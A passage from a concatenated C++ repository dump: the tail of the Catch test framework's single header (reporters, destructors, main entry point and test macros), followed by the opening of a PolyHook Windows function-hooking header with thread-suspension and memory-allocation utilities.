				columns.push_back(SummaryColumn("failed", Colour::ResultError)
					.addRow(totals.testCases.failed)
					.addRow(totals.assertions.failed));
				columns.push_back(SummaryColumn("failed as expected", Colour::ResultExpectedFailure)
					.addRow(totals.testCases.failedButOk)
					.addRow(totals.assertions.failedButOk));

				printSummaryRow("test cases", columns, 0);
				printSummaryRow("assertions", columns, 1);
			}
		}
		void printSummaryRow(std::string const& label, std::vector<SummaryColumn> const& cols, std::size_t row) {
			for (std::vector<SummaryColumn>::const_iterator it = cols.begin(); it != cols.end(); ++it) {
				std::string value = it->rows[row];
				if (it->label.empty()) {
					stream << label << ": ";
					if (value != "0")
						stream << value;
					else
						stream << Colour(Colour::Warning) << "- none -";
				}
				else if (value != "0") {
					stream << Colour(Colour::LightGrey) << " | ";
					stream << Colour(it->colour)
						<< value << " " << it->label;
				}
			}
			stream << "\n";
		}

		static std::size_t makeRatio(std::size_t number, std::size_t total) {
			std::size_t ratio = total > 0 ? CATCH_CONFIG_CONSOLE_WIDTH * number / total : 0;
			return (ratio == 0 && number > 0) ? 1 : ratio;
		}
		static std::size_t& findMax(std::size_t& i, std::size_t& j, std::size_t& k) {
			if (i > j && i > k)
				return i;
			else if (j > k)
				return j;
			else
				return k;
		}

		void printTotalsDivider(Totals const& totals) {
			if (totals.testCases.total() > 0) {
				std::size_t failedRatio = makeRatio(totals.testCases.failed, totals.testCases.total());
				std::size_t failedButOkRatio = makeRatio(totals.testCases.failedButOk, totals.testCases.total());
				std::size_t passedRatio = makeRatio(totals.testCases.passed, totals.testCases.total());
				while (failedRatio + failedButOkRatio + passedRatio < CATCH_CONFIG_CONSOLE_WIDTH - 1)
					findMax(failedRatio, failedButOkRatio, passedRatio)++;
				while (failedRatio + failedButOkRatio + passedRatio > CATCH_CONFIG_CONSOLE_WIDTH - 1)
					findMax(failedRatio, failedButOkRatio, passedRatio)--;

				stream << Colour(Colour::Error) << std::string(failedRatio, '=');
				stream << Colour(Colour::ResultExpectedFailure) << std::string(failedButOkRatio, '=');
				if (totals.testCases.allPassed())
					stream << Colour(Colour::ResultSuccess) << std::string(passedRatio, '=');
				else
					stream << Colour(Colour::Success) << std::string(passedRatio, '=');
			}
			else {
				stream << Colour(Colour::Warning) << std::string(CATCH_CONFIG_CONSOLE_WIDTH - 1, '=');
			}
			stream << "\n";
		}
		void printSummaryDivider() {
			stream << getLineOfChars<'-'>() << "\n";
		}

	private:
		bool m_headerPrinted;
	};

	INTERNAL_CATCH_REGISTER_REPORTER("console", ConsoleReporter)

} // end namespace Catch

  // #included from: ../reporters/catch_reporter_compact.hpp
#define TWOBLUECUBES_CATCH_REPORTER_COMPACT_HPP_INCLUDED

namespace Catch {

	struct CompactReporter : StreamingReporterBase {

		CompactReporter(ReporterConfig const& _config)
			: StreamingReporterBase(_config)
		{}

		virtual ~CompactReporter();

		static std::string getDescription() {
			return "Reports test results on a single line, suitable for IDEs";
		}

		virtual ReporterPreferences getPreferences() const {
			ReporterPreferences prefs;
			prefs.shouldRedirectStdOut = false;
			return prefs;
		}

		virtual void noMatchingTestCases(std::string const& spec) {
			stream << "No test cases matched '" << spec << "'" << std::endl;
		}

		virtual void assertionStarting(AssertionInfo const&) {
		}

		virtual bool assertionEnded(AssertionStats const& _assertionStats) {
			AssertionResult const& result = _assertionStats.assertionResult;

			bool printInfoMessages = true;

			// Drop out if result was successful and we're not printing those
			if (!m_config->includeSuccessfulResults() && result.isOk()) {
				if (result.getResultType() != ResultWas::Warning)
					return false;
				printInfoMessages = false;
			}

			AssertionPrinter printer(stream, _assertionStats, printInfoMessages);
			printer.print();

			stream << std::endl;
			return true;
		}

		virtual void testRunEnded(TestRunStats const& _testRunStats) {
			printTotals(_testRunStats.totals);
			stream << "\n" << std::endl;
			StreamingReporterBase::testRunEnded(_testRunStats);
		}

	private:
		class AssertionPrinter {
			void operator= (AssertionPrinter const&);
		public:
			AssertionPrinter(std::ostream& _stream, AssertionStats const& _stats, bool _printInfoMessages)
				: stream(_stream)
				, stats(_stats)
				, result(_stats.assertionResult)
				, messages(_stats.infoMessages)
				, itMessage(_stats.infoMessages.begin())
				, printInfoMessages(_printInfoMessages)
			{}

			void print() {
				printSourceInfo();

				itMessage = messages.begin();

				switch (result.getResultType()) {
				case ResultWas::Ok:
					printResultType(Colour::ResultSuccess, passedString());
					printOriginalExpression();
					printReconstructedExpression();
					if (!result.hasExpression())
						printRemainingMessages(Colour::None);
					else
						printRemainingMessages();
					break;
				case ResultWas::ExpressionFailed:
					if (result.isOk())
						printResultType(Colour::ResultSuccess, failedString() + std::string(" - but was ok"));
					else
						printResultType(Colour::Error, failedString());
					printOriginalExpression();
					printReconstructedExpression();
					printRemainingMessages();
					break;
				case ResultWas::ThrewException:
					printResultType(Colour::Error, failedString());
					printIssue("unexpected exception with message:");
					printMessage();
					printExpressionWas();
					printRemainingMessages();
					break;
				case ResultWas::FatalErrorCondition:
					printResultType(Colour::Error, failedString());
					printIssue("fatal error condition with message:");
					printMessage();
					printExpressionWas();
					printRemainingMessages();
					break;
				case ResultWas::DidntThrowException:
					printResultType(Colour::Error, failedString());
					printIssue("expected exception, got none");
					printExpressionWas();
					printRemainingMessages();
					break;
				case ResultWas::Info:
					printResultType(Colour::None, "info");
					printMessage();
					printRemainingMessages();
					break;
				case ResultWas::Warning:
					printResultType(Colour::None, "warning");
					printMessage();
					printRemainingMessages();
					break;
				case ResultWas::ExplicitFailure:
					printResultType(Colour::Error, failedString());
					printIssue("explicitly");
					printRemainingMessages(Colour::None);
					break;
					// These cases are here to prevent compiler warnings
				case ResultWas::Unknown:
				case ResultWas::FailureBit:
				case ResultWas::Exception:
					printResultType(Colour::Error, "** internal error **");
					break;
				}
			}

		private:
			// Colour::LightGrey

			static Colour::Code dimColour() { return Colour::FileName; }

#ifdef CATCH_PLATFORM_MAC
			static const char* failedString() { return "FAILED"; }
			static const char* passedString() { return "PASSED"; }
#else
			static const char* failedString() { return "failed"; }
			static const char* passedString() { return "passed"; }
#endif

			void printSourceInfo() const {
				Colour colourGuard(Colour::FileName);
				stream << result.getSourceInfo() << ":";
			}

			void printResultType(Colour::Code colour, std::string passOrFail) const {
				if (!passOrFail.empty()) {
					{
						Colour colourGuard(colour);
						stream << " " << passOrFail;
					}
					stream << ":";
				}
			}

			void printIssue(std::string issue) const {
				stream << " " << issue;
			}

			void printExpressionWas() {
				if (result.hasExpression()) {
					stream << ";";
					{
						Colour colour(dimColour());
						stream << " expression was:";
					}
					printOriginalExpression();
				}
			}

			void printOriginalExpression() const {
				if (result.hasExpression()) {
					stream << " " << result.getExpression();
				}
			}

			void printReconstructedExpression() const {
				if (result.hasExpandedExpression()) {
					{
						Colour colour(dimColour());
						stream << " for: ";
					}
					stream << result.getExpandedExpression();
				}
			}

			void printMessage() {
				if (itMessage != messages.end()) {
					stream << " '" << itMessage->message << "'";
					++itMessage;
				}
			}

			void printRemainingMessages(Colour::Code colour = dimColour()) {
				if (itMessage == messages.end())
					return;

				// using messages.end() directly yields compilation error:
				std::vector<MessageInfo>::const_iterator itEnd = messages.end();
				const std::size_t N = static_cast<std::size_t>(std::distance(itMessage, itEnd));

				{
					Colour colourGuard(colour);
					stream << " with " << pluralise(N, "message") << ":";
				}

				for (; itMessage != itEnd; ) {
					// If this assertion is a warning ignore any INFO messages
					if (printInfoMessages || itMessage->type != ResultWas::Info) {
						stream << " '" << itMessage->message << "'";
						if (++itMessage != itEnd) {
							Colour colourGuard(dimColour());
							stream << " and";
						}
					}
				}
			}

		private:
			std::ostream& stream;
			AssertionStats const& stats;
			AssertionResult const& result;
			std::vector<MessageInfo> messages;
			std::vector<MessageInfo>::const_iterator itMessage;
			bool printInfoMessages;
		};

		// Colour, message variants:
		// - white: No tests ran.
		// -   red: Failed [both/all] N test cases, failed [both/all] M assertions.
		// - white: Passed [both/all] N test cases (no assertions).
		// -   red: Failed N tests cases, failed M assertions.
		// - green: Passed [both/all] N tests cases with M assertions.

		std::string bothOrAll(std::size_t count) const {
			return count == 1 ? "" : count == 2 ? "both " : "all ";
		}

		void printTotals(const Totals& totals) const {
			if (totals.testCases.total() == 0) {
				stream << "No tests ran.";
			}
			else if (totals.testCases.failed == totals.testCases.total()) {
				Colour colour(Colour::ResultError);
				const std::string qualify_assertions_failed =
					totals.assertions.failed == totals.assertions.total() ?
					bothOrAll(totals.assertions.failed) : "";
				stream <<
					"Failed " << bothOrAll(totals.testCases.failed)
					<< pluralise(totals.testCases.failed, "test case") << ", "
					"failed " << qualify_assertions_failed <<
					pluralise(totals.assertions.failed, "assertion") << ".";
			}
			else if (totals.assertions.total() == 0) {
				stream <<
					"Passed " << bothOrAll(totals.testCases.total())
					<< pluralise(totals.testCases.total(), "test case")
					<< " (no assertions).";
			}
			else if (totals.assertions.failed) {
				Colour colour(Colour::ResultError);
				stream <<
					"Failed " << pluralise(totals.testCases.failed, "test case") << ", "
					"failed " << pluralise(totals.assertions.failed, "assertion") << ".";
			}
			else {
				Colour colour(Colour::ResultSuccess);
				stream <<
					"Passed " << bothOrAll(totals.testCases.passed)
					<< pluralise(totals.testCases.passed, "test case") <<
					" with " << pluralise(totals.assertions.passed, "assertion") << ".";
			}
		}
	};

	INTERNAL_CATCH_REGISTER_REPORTER("compact", CompactReporter)

} // end namespace Catch

namespace Catch {
	// These are all here to avoid warnings about not having any out of line
	// virtual methods
	NonCopyable::~NonCopyable() {}
	IShared::~IShared() {}
	IStream::~IStream() CATCH_NOEXCEPT {}
	FileStream::~FileStream() CATCH_NOEXCEPT {}
	CoutStream::~CoutStream() CATCH_NOEXCEPT {}
	DebugOutStream::~DebugOutStream() CATCH_NOEXCEPT {}
	StreamBufBase::~StreamBufBase() CATCH_NOEXCEPT {}
	IContext::~IContext() {}
	IResultCapture::~IResultCapture() {}
	ITestCase::~ITestCase() {}
	ITestCaseRegistry::~ITestCaseRegistry() {}
	IRegistryHub::~IRegistryHub() {}
	IMutableRegistryHub::~IMutableRegistryHub() {}
	IExceptionTranslator::~IExceptionTranslator() {}
	IExceptionTranslatorRegistry::~IExceptionTranslatorRegistry() {}
	IReporter::~IReporter() {}
	IReporterFactory::~IReporterFactory() {}
	IReporterRegistry::~IReporterRegistry() {}
	IStreamingReporter::~IStreamingReporter() {}
	AssertionStats::~AssertionStats() {}
	SectionStats::~SectionStats() {}
	TestCaseStats::~TestCaseStats() {}
	TestGroupStats::~TestGroupStats() {}
	TestRunStats::~TestRunStats() {}
	CumulativeReporterBase::SectionNode::~SectionNode() {}
	CumulativeReporterBase::~CumulativeReporterBase() {}

	StreamingReporterBase::~StreamingReporterBase() {}
	ConsoleReporter::~ConsoleReporter() {}
	CompactReporter::~CompactReporter() {}
	IRunner::~IRunner() {}
	IMutableContext::~IMutableContext() {}
	IConfig::~IConfig() {}
	XmlReporter::~XmlReporter() {}
	JunitReporter::~JunitReporter() {}
	TestRegistry::~TestRegistry() {}
	FreeFunctionTestCase::~FreeFunctionTestCase() {}
	IGeneratorInfo::~IGeneratorInfo() {}
	IGeneratorsForTest::~IGeneratorsForTest() {}
	WildcardPattern::~WildcardPattern() {}
	TestSpec::Pattern::~Pattern() {}
	TestSpec::NamePattern::~NamePattern() {}
	TestSpec::TagPattern::~TagPattern() {}
	TestSpec::ExcludedPattern::~ExcludedPattern() {}

	Matchers::Impl::StdString::Equals::~Equals() {}
	Matchers::Impl::StdString::Contains::~Contains() {}
	Matchers::Impl::StdString::StartsWith::~StartsWith() {}
	Matchers::Impl::StdString::EndsWith::~EndsWith() {}

	void Config::dummy() {}

	namespace TestCaseTracking {
		ITracker::~ITracker() {}
		TrackerBase::~TrackerBase() {}
		SectionTracker::~SectionTracker() {}
		IndexTracker::~IndexTracker() {}
	}
}

#ifdef __clang__
#pragma clang diagnostic pop
#endif

#endif

#ifdef CATCH_CONFIG_MAIN
// #included from: internal/catch_default_main.hpp
#define TWOBLUECUBES_CATCH_DEFAULT_MAIN_HPP_INCLUDED

#ifndef __OBJC__

// Standard C/C++ main entry point
int main(int argc, char * argv[]) {
	return Catch::Session().run(argc, argv);
}

#else // __OBJC__

// Objective-C entry point
int main(int argc, char * const argv[]) {
#if !CATCH_ARC_ENABLED
	NSAutoreleasePool * pool = [[NSAutoreleasePool alloc] init];
#endif

	Catch::registerTestMethods();
	int result = Catch::Session().run(argc, (char* const*)argv);

#if !CATCH_ARC_ENABLED
	[pool drain];
#endif

	return result;
}

#endif // __OBJC__

#endif

#ifdef CLARA_CONFIG_MAIN_NOT_DEFINED
#  undef CLARA_CONFIG_MAIN
#endif

//////

// If this config identifier is defined then all CATCH macros are prefixed with CATCH_
#ifdef CATCH_CONFIG_PREFIX_ALL

#define CATCH_REQUIRE( expr ) INTERNAL_CATCH_TEST( expr, Catch::ResultDisposition::Normal, "CATCH_REQUIRE" )
#define CATCH_REQUIRE_FALSE( expr ) INTERNAL_CATCH_TEST( expr, Catch::ResultDisposition::Normal | Catch::ResultDisposition::FalseTest, "CATCH_REQUIRE_FALSE" )

#define CATCH_REQUIRE_THROWS( expr ) INTERNAL_CATCH_THROWS( expr, Catch::ResultDisposition::Normal, "", "CATCH_REQUIRE_THROWS" )
#define CATCH_REQUIRE_THROWS_AS( expr, exceptionType ) INTERNAL_CATCH_THROWS_AS( expr, exceptionType, Catch::ResultDisposition::Normal, "CATCH_REQUIRE_THROWS_AS" )
#define CATCH_REQUIRE_THROWS_WITH( expr, matcher ) INTERNAL_CATCH_THROWS( expr, Catch::ResultDisposition::Normal, matcher, "CATCH_REQUIRE_THROWS_WITH" )
#define CATCH_REQUIRE_NOTHROW( expr ) INTERNAL_CATCH_NO_THROW( expr, Catch::ResultDisposition::Normal, "CATCH_REQUIRE_NOTHROW" )

#define CATCH_CHECK( expr ) INTERNAL_CATCH_TEST( expr, Catch::ResultDisposition::ContinueOnFailure, "CATCH_CHECK" )
#define CATCH_CHECK_FALSE( expr ) INTERNAL_CATCH_TEST( expr, Catch::ResultDisposition::ContinueOnFailure | Catch::ResultDisposition::FalseTest, "CATCH_CHECK_FALSE" )
#define CATCH_CHECKED_IF( expr ) INTERNAL_CATCH_IF( expr, Catch::ResultDisposition::ContinueOnFailure, "CATCH_CHECKED_IF" )
#define CATCH_CHECKED_ELSE( expr ) INTERNAL_CATCH_ELSE( expr, Catch::ResultDisposition::ContinueOnFailure, "CATCH_CHECKED_ELSE" )
#define CATCH_CHECK_NOFAIL( expr ) INTERNAL_CATCH_TEST( expr, Catch::ResultDisposition::ContinueOnFailure | Catch::ResultDisposition::SuppressFail, "CATCH_CHECK_NOFAIL" )

#define CATCH_CHECK_THROWS( expr )  INTERNAL_CATCH_THROWS( expr, Catch::ResultDisposition::ContinueOnFailure, "CATCH_CHECK_THROWS" )
#define CATCH_CHECK_THROWS_AS( expr, exceptionType ) INTERNAL_CATCH_THROWS_AS( expr, exceptionType, Catch::ResultDisposition::ContinueOnFailure, "CATCH_CHECK_THROWS_AS" )
#define CATCH_CHECK_THROWS_WITH( expr, matcher ) INTERNAL_CATCH_THROWS( expr, Catch::ResultDisposition::ContinueOnFailure, matcher, "CATCH_CHECK_THROWS_WITH" )
#define CATCH_CHECK_NOTHROW( expr ) INTERNAL_CATCH_NO_THROW( expr, Catch::ResultDisposition::ContinueOnFailure, "CATCH_CHECK_NOTHROW" )

#define CHECK_THAT( arg, matcher ) INTERNAL_CHECK_THAT( arg, matcher, Catch::ResultDisposition::ContinueOnFailure, "CATCH_CHECK_THAT" )
#define CATCH_REQUIRE_THAT( arg, matcher ) INTERNAL_CHECK_THAT( arg, matcher, Catch::ResultDisposition::Normal, "CATCH_REQUIRE_THAT" )

#define CATCH_INFO( msg ) INTERNAL_CATCH_INFO( msg, "CATCH_INFO" )
#define CATCH_WARN( msg ) INTERNAL_CATCH_MSG( Catch::ResultWas::Warning, Catch::ResultDisposition::ContinueOnFailure, "CATCH_WARN", msg )
#define CATCH_SCOPED_INFO( msg ) INTERNAL_CATCH_INFO( msg, "CATCH_INFO" )
#define CATCH_CAPTURE( msg ) INTERNAL_CATCH_INFO( #msg " := " << msg, "CATCH_CAPTURE" )
#define CATCH_SCOPED_CAPTURE( msg ) INTERNAL_CATCH_INFO( #msg " := " << msg, "CATCH_CAPTURE" )

#ifdef CATCH_CONFIG_VARIADIC_MACROS
#define CATCH_TEST_CASE( ... ) INTERNAL_CATCH_TESTCASE( __VA_ARGS__ )
#define CATCH_TEST_CASE_METHOD( className, ... ) INTERNAL_CATCH_TEST_CASE_METHOD( className, __VA_ARGS__ )
#define CATCH_METHOD_AS_TEST_CASE( method, ... ) INTERNAL_CATCH_METHOD_AS_TEST_CASE( method, __VA_ARGS__ )
#define CATCH_REGISTER_TEST_CASE( Function, ... ) INTERNAL_CATCH_REGISTER_TESTCASE( Function, __VA_ARGS__ )
#define CATCH_SECTION( ... ) INTERNAL_CATCH_SECTION( __VA_ARGS__ )
#define CATCH_FAIL( ... ) INTERNAL_CATCH_MSG( Catch::ResultWas::ExplicitFailure, Catch::ResultDisposition::Normal, "CATCH_FAIL", __VA_ARGS__ )
#define CATCH_SUCCEED( ... ) INTERNAL_CATCH_MSG( Catch::ResultWas::Ok, Catch::ResultDisposition::ContinueOnFailure, "CATCH_SUCCEED", __VA_ARGS__ )
#else
#define CATCH_TEST_CASE( name, description ) INTERNAL_CATCH_TESTCASE( name, description )
#define CATCH_TEST_CASE_METHOD( className, name, description ) INTERNAL_CATCH_TEST_CASE_METHOD( className, name, description )
#define CATCH_METHOD_AS_TEST_CASE( method, name, description ) INTERNAL_CATCH_METHOD_AS_TEST_CASE( method, name, description )
#define CATCH_REGISTER_TEST_CASE( function, name, description ) INTERNAL_CATCH_REGISTER_TESTCASE( function, name, description )
#define CATCH_SECTION( name, description ) INTERNAL_CATCH_SECTION( name, description )
#define CATCH_FAIL( msg ) INTERNAL_CATCH_MSG( Catch::ResultWas::ExplicitFailure, Catch::ResultDisposition::Normal, "CATCH_FAIL", msg )
#define CATCH_SUCCEED( msg ) INTERNAL_CATCH_MSG( Catch::ResultWas::Ok, Catch::ResultDisposition::ContinueOnFailure, "CATCH_SUCCEED", msg )
#endif
#define CATCH_ANON_TEST_CASE() INTERNAL_CATCH_TESTCASE( "", "" )

#define CATCH_REGISTER_REPORTER( name, reporterType ) INTERNAL_CATCH_REGISTER_REPORTER( name, reporterType )
#define CATCH_REGISTER_LEGACY_REPORTER( name, reporterType ) INTERNAL_CATCH_REGISTER_LEGACY_REPORTER( name, reporterType )

#define CATCH_GENERATE( expr) INTERNAL_CATCH_GENERATE( expr )

// "BDD-style" convenience wrappers
#ifdef CATCH_CONFIG_VARIADIC_MACROS
#define CATCH_SCENARIO( ... ) CATCH_TEST_CASE( "Scenario: " __VA_ARGS__ )
#define CATCH_SCENARIO_METHOD( className, ... ) INTERNAL_CATCH_TEST_CASE_METHOD( className, "Scenario: " __VA_ARGS__ )
#else
#define CATCH_SCENARIO( name, tags ) CATCH_TEST_CASE( "Scenario: " name, tags )
#define CATCH_SCENARIO_METHOD( className, name, tags ) INTERNAL_CATCH_TEST_CASE_METHOD( className, "Scenario: " name, tags )
#endif
#define CATCH_GIVEN( desc )    CATCH_SECTION( std::string( "Given: ") + desc, "" )
#define CATCH_WHEN( desc )     CATCH_SECTION( std::string( " When: ") + desc, "" )
#define CATCH_AND_WHEN( desc ) CATCH_SECTION( std::string( "  And: ") + desc, "" )
#define CATCH_THEN( desc )     CATCH_SECTION( std::string( " Then: ") + desc, "" )
#define CATCH_AND_THEN( desc ) CATCH_SECTION( std::string( "  And: ") + desc, "" )

// If CATCH_CONFIG_PREFIX_ALL is not defined then the CATCH_ prefix is not required
#else

#define REQUIRE( expr ) INTERNAL_CATCH_TEST( expr, Catch::ResultDisposition::Normal, "REQUIRE" )
#define REQUIRE_FALSE( expr ) INTERNAL_CATCH_TEST( expr, Catch::ResultDisposition::Normal | Catch::ResultDisposition::FalseTest, "REQUIRE_FALSE" )

#define REQUIRE_THROWS( expr ) INTERNAL_CATCH_THROWS( expr, Catch::ResultDisposition::Normal, "", "REQUIRE_THROWS" )
#define REQUIRE_THROWS_AS( expr, exceptionType ) INTERNAL_CATCH_THROWS_AS( expr, exceptionType, Catch::ResultDisposition::Normal, "REQUIRE_THROWS_AS" )
#define REQUIRE_THROWS_WITH( expr, matcher ) INTERNAL_CATCH_THROWS( expr, Catch::ResultDisposition::Normal, matcher, "REQUIRE_THROWS_WITH" )
#define REQUIRE_NOTHROW( expr ) INTERNAL_CATCH_NO_THROW( expr, Catch::ResultDisposition::Normal, "REQUIRE_NOTHROW" )

#define CHECK( expr ) INTERNAL_CATCH_TEST( expr, Catch::ResultDisposition::ContinueOnFailure, "CHECK" )
#define CHECK_FALSE( expr ) INTERNAL_CATCH_TEST( expr, Catch::ResultDisposition::ContinueOnFailure | Catch::ResultDisposition::FalseTest, "CHECK_FALSE" )
#define CHECKED_IF( expr ) INTERNAL_CATCH_IF( expr, Catch::ResultDisposition::ContinueOnFailure, "CHECKED_IF" )
#define CHECKED_ELSE( expr ) INTERNAL_CATCH_ELSE( expr, Catch::ResultDisposition::ContinueOnFailure, "CHECKED_ELSE" )
#define CHECK_NOFAIL( expr ) INTERNAL_CATCH_TEST( expr, Catch::ResultDisposition::ContinueOnFailure | Catch::ResultDisposition::SuppressFail, "CHECK_NOFAIL" )

#define CHECK_THROWS( expr )  INTERNAL_CATCH_THROWS( expr, Catch::ResultDisposition::ContinueOnFailure, "", "CHECK_THROWS" )
#define CHECK_THROWS_AS( expr, exceptionType ) INTERNAL_CATCH_THROWS_AS( expr, exceptionType, Catch::ResultDisposition::ContinueOnFailure, "CHECK_THROWS_AS" )
#define CHECK_THROWS_WITH( expr, matcher ) INTERNAL_CATCH_THROWS( expr, Catch::ResultDisposition::ContinueOnFailure, matcher, "CHECK_THROWS_WITH" )
#define CHECK_NOTHROW( expr ) INTERNAL_CATCH_NO_THROW( expr, Catch::ResultDisposition::ContinueOnFailure, "CHECK_NOTHROW" )

#define CHECK_THAT( arg, matcher ) INTERNAL_CHECK_THAT( arg, matcher, Catch::ResultDisposition::ContinueOnFailure, "CHECK_THAT" )
#define REQUIRE_THAT( arg, matcher ) INTERNAL_CHECK_THAT( arg, matcher, Catch::ResultDisposition::Normal, "REQUIRE_THAT" )

#define INFO( msg ) INTERNAL_CATCH_INFO( msg, "INFO" )
#define WARN( msg ) INTERNAL_CATCH_MSG( Catch::ResultWas::Warning, Catch::ResultDisposition::ContinueOnFailure, "WARN", msg )
#define SCOPED_INFO( msg ) INTERNAL_CATCH_INFO( msg, "INFO" )
#define CAPTURE( msg ) INTERNAL_CATCH_INFO( #msg " := " << msg, "CAPTURE" )
#define SCOPED_CAPTURE( msg ) INTERNAL_CATCH_INFO( #msg " := " << msg, "CAPTURE" )

#ifdef CATCH_CONFIG_VARIADIC_MACROS
#define TEST_CASE( ... ) INTERNAL_CATCH_TESTCASE( __VA_ARGS__ )
#define TEST_CASE_METHOD( className, ... ) INTERNAL_CATCH_TEST_CASE_METHOD( className, __VA_ARGS__ )
#define METHOD_AS_TEST_CASE( method, ... ) INTERNAL_CATCH_METHOD_AS_TEST_CASE( method, __VA_ARGS__ )
#define REGISTER_TEST_CASE( Function, ... ) INTERNAL_CATCH_REGISTER_TESTCASE( Function, __VA_ARGS__ )
#define SECTION( ... ) INTERNAL_CATCH_SECTION( __VA_ARGS__ )
#define FAIL( ... ) INTERNAL_CATCH_MSG( Catch::ResultWas::ExplicitFailure, Catch::ResultDisposition::Normal, "FAIL", __VA_ARGS__ )
#define SUCCEED( ... ) INTERNAL_CATCH_MSG( Catch::ResultWas::Ok, Catch::ResultDisposition::ContinueOnFailure, "SUCCEED", __VA_ARGS__ )
#else
#define TEST_CASE( name, description ) INTERNAL_CATCH_TESTCASE( name, description )
#define TEST_CASE_METHOD( className, name, description ) INTERNAL_CATCH_TEST_CASE_METHOD( className, name, description )
#define METHOD_AS_TEST_CASE( method, name, description ) INTERNAL_CATCH_METHOD_AS_TEST_CASE( method, name, description )
#define REGISTER_TEST_CASE( method, name, description ) INTERNAL_CATCH_REGISTER_TESTCASE( method, name, description )
#define SECTION( name, description ) INTERNAL_CATCH_SECTION( name, description )
#define FAIL( msg ) INTERNAL_CATCH_MSG( Catch::ResultWas::ExplicitFailure, Catch::ResultDisposition::Normal, "FAIL", msg )
#define SUCCEED( msg ) INTERNAL_CATCH_MSG( Catch::ResultWas::Ok, Catch::ResultDisposition::ContinueOnFailure, "SUCCEED", msg )
#endif
#define ANON_TEST_CASE() INTERNAL_CATCH_TESTCASE( "", "" )

#define REGISTER_REPORTER( name, reporterType ) INTERNAL_CATCH_REGISTER_REPORTER( name, reporterType )
#define REGISTER_LEGACY_REPORTER( name, reporterType ) INTERNAL_CATCH_REGISTER_LEGACY_REPORTER( name, reporterType )

#define GENERATE( expr) INTERNAL_CATCH_GENERATE( expr )

#endif

#define CATCH_TRANSLATE_EXCEPTION( signature ) INTERNAL_CATCH_TRANSLATE_EXCEPTION( signature )

// "BDD-style" convenience wrappers
#ifdef CATCH_CONFIG_VARIADIC_MACROS
#define SCENARIO( ... ) TEST_CASE( "Scenario: " __VA_ARGS__ )
#define SCENARIO_METHOD( className, ... ) INTERNAL_CATCH_TEST_CASE_METHOD( className, "Scenario: " __VA_ARGS__ )
#else
#define SCENARIO( name, tags ) TEST_CASE( "Scenario: " name, tags )
#define SCENARIO_METHOD( className, name, tags ) INTERNAL_CATCH_TEST_CASE_METHOD( className, "Scenario: " name, tags )
#endif
#define GIVEN( desc )    SECTION( std::string("   Given: ") + desc, "" )
#define WHEN( desc )     SECTION( std::string("    When: ") + desc, "" )
#define AND_WHEN( desc ) SECTION( std::string("And when: ") + desc, "" )
#define THEN( desc )     SECTION( std::string("    Then: ") + desc, "" )
#define AND_THEN( desc ) SECTION( std::string("     And: ") + desc, "" )

using Catch::Detail::Approx;

#endif // TWOBLUECUBES_SINGLE_INCLUDE_CATCH_HPP_INCLUDED


```

`libs/PolyHook/PolyHook.hpp`:

```hpp
#ifndef POLYHOOK_H
#define POLYHOOK_H
#include <windows.h>
#include "../Capstone/include/capstone.h"
#include <DbgHelp.h>
#include <string>
#include <vector>
#include <mutex>
#include <algorithm>
#include <utility>
#include <TlHelp32.h>
#include <assert.h>
#pragma comment(lib,"Dbghelp.lib")
#pragma comment(lib,"capstone.lib")
#define PLH_SHOW_DEBUG_MESSAGES 1 //To print messages even in release

namespace PLH {
	namespace Tools
	{
		inline void XTrace(const char* fmt, ...)
		{
			va_list args;
			va_start(args, fmt);
#if defined(_DEBUG) || defined(PLH_SHOW_DEBUG_MESSAGES)
			vfprintf_s(stdout, fmt, args);
#endif
			va_end(args);
		}

		class ThreadHandle
		{
		public:
			//Thread ID, OpenThread's AccessFlag 
			ThreadHandle(DWORD ThreadId, DWORD  DesiredAccessFlags) : m_ThreadId(ThreadId), m_IsSuspended(false)
			{
				m_hThread = OpenThread(DesiredAccessFlags, FALSE, ThreadId);
				if(m_hThread == NULL)
					throw "PolyHook: Failed to open thread in class ThreadHandle";
			}

			//Only allow once instance to control a handle
			ThreadHandle(const ThreadHandle& other) = delete; //copy
			ThreadHandle& operator=(const ThreadHandle& other) = delete; //copy assignment

			//Move
			ThreadHandle(ThreadHandle &&other) noexcept
				: m_IsSuspended(other.m_IsSuspended)
				, m_hThread(other.m_hThread)
				, m_ThreadId(other.m_ThreadId)
			{
				other.m_hThread = nullptr;
				other.m_IsSuspended = false;
			}

			//Move assignment
			ThreadHandle& operator=(ThreadHandle &&other) noexcept
			{
				if (this != &other)
				{
					m_IsSuspended = other.m_IsSuspended;
					m_hThread = other.m_hThread;
					m_ThreadId = other.m_ThreadId;

					other.m_hThread = nullptr;
					other.m_IsSuspended = false;
				}
				return *this;
			}


			//false resumes, true suspends
			void ToggleSuspend(bool Suspend)
			{
				if (Suspend && !m_IsSuspended)
				{
					if(SuspendThread(m_hThread) != -1)
						m_IsSuspended = true;
				}else if (!Suspend && m_IsSuspended){
					if(ResumeThread(m_hThread) != -1)
						m_IsSuspended = false;
				}
			}

			~ThreadHandle()
			{
				if (m_IsSuspended)
					ToggleSuspend(false);

				if (m_hThread)
					CloseHandle(m_hThread);
			}
		private:
			bool m_IsSuspended;
			HANDLE m_hThread;
			DWORD m_ThreadId;
		};

		class ThreadManager
		{
		public:
			void SuspendThreads()
			{
				UpdateThreadList(GetCurrentThreadId());
				for (ThreadHandle& ThreadInstance : m_SuspendedThreads)
				{
					ThreadInstance.ToggleSuspend(true);
				}
			}

			void ResumeThreads()
			{
				for (ThreadHandle& ThreadInstance : m_SuspendedThreads)
				{
					ThreadInstance.ToggleSuspend(false);
				}
			}
		private:
			void UpdateThreadList(DWORD CallingThreadId)
			{
				m_SuspendedThreads.clear();
				HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
				if (h == INVALID_HANDLE_VALUE)
					return;

				THREADENTRY32 te;
				te.dwSize = sizeof(te);
				BOOL Result = FALSE;
				//Loop threads
				for (Result = Thread32First(h, &te), te.dwSize = sizeof(te); Result == TRUE && Thread32Next(h, &te); )
				{
					//Verify size field was set properly
					if (te.dwSize < RTL_SIZEOF_THROUGH_FIELD(THREADENTRY32, th32OwnerProcessID))
						continue;
					
					if (te.th32ThreadID != CallingThreadId && te.th32OwnerProcessID == GetCurrentProcessId())
						m_SuspendedThreads.emplace_back(te.th32ThreadID, THREAD_SUSPEND_RESUME);
				}
				CloseHandle(h);
			}
			std::vector<Tools::ThreadHandle> m_SuspendedThreads;
		};

		inline void* Allocate_2GB_IMPL(uint8_t* pStart,size_t Size,int_fast64_t Delta)
		{
			/*These lambda's let us use a single for loop for both the forward and backward loop conditions.
			I passed delta variable as a parameter instead of capturing it because it is faster, it allows
